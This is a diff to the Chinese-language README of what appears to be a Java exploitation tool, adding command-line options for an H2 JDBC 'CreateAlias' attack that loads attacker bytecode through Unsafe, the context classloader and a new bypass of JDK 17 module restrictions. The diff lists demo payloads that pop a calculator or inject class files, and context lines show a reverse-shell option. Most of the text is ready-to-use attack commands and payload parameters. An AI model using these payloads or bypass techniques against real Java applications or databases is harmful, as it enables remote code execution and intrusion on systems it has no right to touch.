@@ -1823,10 +1823,16 @@ H2连接时的一些配置参数：
 -m JdbcAttack -g H2CreateAlias -a "reverse_shell:127.0.0.1:2333"
 
 #unsafe进行字节码加载
+-m JdbcAttack -g H2CreateAlias -a "unsafe_defineAnonymousClass:auto_cmd:calc"
 -m JdbcAttack -g H2CreateAlias -a "unsafe_defineAnonymousClass:class_file:<class_file_path>"
 
 #classloader进行字节码加载
+-m JdbcAttack -g H2CreateAlias -a "classloader_defineclass:auto_cmd:calc"
 -m JdbcAttack -g H2CreateAlias -a "classloader_defineclass:class_file:<class_file_path>"
+
+#bypassjdk高版本的module限制
+-m JdbcAttack -g H2CreateAlias -a "bypassmodule_classloader_defineclass:auto_cmd:calc"
+-m JdbcAttack -g H2CreateAlias -a "bypassmodule_classloader_defineclass:class_file:<class_file_path>"
 ```
 
 #### H2RunScript 远程加载sql文件
@@ -2913,14 +2919,17 @@ rmi://127.0.0.1:1234/Basic
 * [ ] reverse_shell 反弹Shell
 * [ ] system_set_property 设置系统属性
 * [ ] shiro_spring_loadclass springmvc中间件场景下从请求参数中读取字节码进行加载
-* [ ] unsafe_defineanonymousclass 使用unsafe的defineanonymousclas方法对字节码进行加载，字节码从下面俩个参数中读取
+* [ ] unsafe_defineanonymousclass 使用unsafe的defineanonymousclas方法对字节码进行加载，后面接字节码执行的漏洞利用效果参数
 
-  * [ ] class_file 从系统路径中注入class文件，执行class代码
-  * [ ] class_base64 注入class base64编码内容，执行class代码
-* [ ] classloader_defineclass 使用线程上下文的classloader方法对字节码进行加载，字节码从下面俩个参数中读取
+  * [ ] unsafe_defineanonymousclass:auto_cmd:calc 弹出计算器
+  * [ ] unsafe_defineanonymousclass:class_file:<class_file> 从系统路径中注入class文件，执行class代码
+* [ ] classloader_defineclass 使用线程上下文的classloader方法对字节码进行加载，后面接字节码执行的漏洞利用效果参数
 
-  * [ ] class_file 从系统路径中注入class文件，执行class代码
-  * [ ] class_base64 注入class base64编码内容，执行class代码
+  * [ ] classloader_defineclass:auto_cmd:calc 弹出计算器
+  * [ ] classloader_defineclass:class_file:<class_file> 从系统路径中注入class文件，执行class代码
+* [ ] bypassmodule_classloader_defineclass 绕过JDK17高版本模块化的限制使用ClassLoader继续进行类加载，后面接字节码执行的漏洞利用效果参数
+  * [ ] bypassmodule_classloader_defineclass:auto_cmd:calc 弹出计算器
+  * [ ] bypassmodule_classloader_defineclass:class_file:<class_file> 从系统路径中注入class文件，执行class代码
 * [ ] springframework_echo 生成SpringFramework的Runtime命令回显代码
 
 ### (一些注意事项)
@@ -2929,7 +2938,8 @@ rmi://127.0.0.1:1234/Basic
 
 unsafe#defineanonymousclass方法加载字节码类时需要注意，JDK版本不同时该方法的差异：
 
-* JDK>8时，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：
+* JDK>=17 时，unsafe没有defineAnonymousClass这个方法
+* 17> JDK >8时，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：
 
   1. 没有包名
   2. 包名跟第一个参数Class的包名一致，此处为java.lang，否则会报错
@@ -2937,7 +2947,7 @@ unsafe#defineanonymousclass方法加载字节码类时需要注意，JDK版本�
       ```java
       byte[] var2 = unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), var2 , null)
       ```
-* JDK<=8时，无上述限制
+* JDK <=8时，无上述限制
 
 所以在使用工具的unsafe_defineanonymousclass时要注意这个情况。classloader_defineclass参数由于采用线程上下文的classloader就没有这个影响，但是有时候该classloader加载的类只能被打一次而unsafe#defineanonymousclass就没有这个情况。所以根据实际情况而选择。
 
